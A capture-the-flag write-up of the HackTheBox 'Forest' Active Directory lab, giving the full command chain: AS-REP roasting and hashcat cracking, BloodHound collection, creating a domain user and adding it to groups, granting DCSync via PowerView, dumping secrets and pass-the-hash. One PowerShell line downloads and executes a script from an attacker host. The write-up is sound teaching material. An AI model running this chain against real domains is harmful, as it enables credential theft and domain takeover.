# Forest (Easy)

Classic AD box: AS-REP roasting into a BloodHound-guided ACL abuse chain ending in DCSync.

## Enumeration

```bash
nmap -sC -sV -p- <target>
```

Domain `htb.local`, Windows Server 2016 DC.

```bash
ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -b DC=htb,DC=local
```
LDAP enumeration (anonymous bind) revealed a service account: `svc-alfresco`.

## Foothold — AS-REP roasting

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip <target> -no-pass
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked password redacted (`<REDACTED>`). Gained a shell and `user.txt` as `svc-alfresco`.

## Privilege Escalation — BloodHound → ACL abuse → DCSync

```bash
upload SharpHound.exe
.\SharpHound.exe
download <timestamp>_BloodHound.zip
```

BloodHound showed `svc-alfresco` is a member of **Exchange Windows Permissions**, which has `WriteDACL` over the domain object.

```bash
net user john <REDACTED> /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

Import PowerView (with an AMSI bypass) and grant the new user DCSync rights:

```powershell
iex(New-Object Net.WebClient).DownloadString('http://<attacker>:8000/PowerView.ps1')
$pass = ConvertTo-SecureString '<REDACTED>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

Dump domain secrets and authenticate as Administrator via pass-the-hash:

```bash
secretsdump.py htb/john@<target>
psexec.py administrator@<target> -hashes <REDACTED>:<REDACTED>
```

## Takeaways

- Service accounts without Kerberos pre-auth are trivially crackable offline.
- Over-privileged built-in groups (Exchange Windows Permissions) are a common AD privesc vector — always map with BloodHound.
